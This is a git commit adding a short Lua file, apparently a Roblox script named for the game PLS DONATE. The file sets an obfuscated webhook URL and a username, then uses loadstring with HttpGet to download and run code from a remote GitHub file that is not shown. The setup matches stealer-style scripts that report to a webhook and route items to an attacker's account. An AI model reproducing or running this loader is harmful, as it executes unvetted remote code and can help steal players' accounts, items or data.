38e31efdf75dc8ab72718a8d314b7a9f885d04a5
kn-h0b <nebisatyusifova@gmail.com>
2025-04-06 16:37:50 +0400

    Create Plsdonatekn.lua

---
+++ Plsdonatekn.lua
@@ -0,0 +1,4 @@
+Webhook = "https://webhook-protect.vercel.app/api/webhook?id=Wlh2Zzd2SFpGR0Fac0pOczMzNTk0dzozRVBqSC1LUzBUZVpLRjVNd0FoMlZFMjVhLW5JQVl3X0xXTEtLWndZRHRQU1pwQWMwSXhMSU9XbGE1U2RmZHk2djFJd19uWk13MnMzWWZnYV9hY3JZOEVWT1oxOGZIY1dmTl9Wd3NfT2VVUVhYUDZ4VDlEVTc3elRnaXdQaW8yTFhkMm9WOTNOcTJfLVRGMlpnY2hMSHJreWtCZEJNZi1jQ1JWRVpPakRCQjQ" -- << Ur webhook
+Username = "im_kiddd8" -- << Ur username
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/lelel22f/wow1/refs/heads/main/f222",true))()
